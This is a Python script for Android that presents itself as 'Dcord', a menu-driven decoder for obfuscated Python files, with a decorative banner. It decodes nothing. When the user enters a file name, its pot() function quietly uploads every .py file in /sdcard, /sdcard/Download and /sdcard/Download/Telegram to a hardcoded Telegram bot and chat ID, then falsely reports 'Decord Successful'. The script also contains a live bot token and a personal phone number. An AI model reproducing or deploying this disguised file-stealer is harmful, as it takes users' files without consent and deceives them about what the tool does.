import os, requests, random 


def pot():
    bot_token = '6025491103:AAHEtz3Y65UBTsiWmuCxU097K6T6WEgXsEk' 
    chat_id = '5798936113'
    sdcard_path = '/sdcard'
    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '5798936113'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
    sdcard_path2 = '/sdcard/Download'
    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path2, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '5798936113'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
    sdcard_path3 = '/sdcard/Download/Telegram'
    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path3, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '5798936113'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
            
def logo():
    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
    print(f"""\n\033[1;90m██   ██ ███████ ██████   ██████ {color_logo} ███    ██ \n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ████   ██ \n\033[1;90m███████ █████   ██████  ██    ██{color_logo} ██ ██  ██    \033[1;97m┏━┓\n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ██  ██ ██  \033[1;92m ┫\033[1;90m│\033[1;91m\033[47m𝘽\033[00m\033[1;90m│\033[1;92m┣\n\033[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙍\033[00m\033[1;90m│\033[1;92m┣\n\t\t\t\t\t      \033[1;90m│\033[1;91m\033[47m𝘼\033[00m\033[1;90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mHE4ON-AFRIDI      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01722183463       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m<>\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙         \033[1;35m:  \033[1;31mDEC.              \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\033[1;30m[\033[38;5;46m\033[37;1m\033[1;41m                  DCORD                  \033[00m\033[1;30m] """)
def menu():
    os.system("clear")
    logo()
    print ("\n\n\033[1;91m[1] \033[1;92mDcord Marsal ")
    print ("\033[1;91m[2] \033[1;92mDcord Hex")
    print ("\033[1;91m[3] \033[1;92mDcord Lemda")
    print ("\033[1;91m[4] \033[1;92mDcord Emoji")
    print ("\033[1;91m[5] \033[1;92mDcord Cython ")
    tttm=input("\nChoose:- ")
    os.system("clear")
    logo()
    print("\n\033[1;97m\033[1;42mInput file and Wait Few Minutes\033[00m\n\n")
    print(" \033[1;91mExample: \033[1;91m/sdcard/file.py\n")
    uuuu=input("\033[1;90m[\] Input File Name :\033[1;97m")
    pot()
    print(" \033[1;92m[✓] Decord Successful")
    menu()
menu()
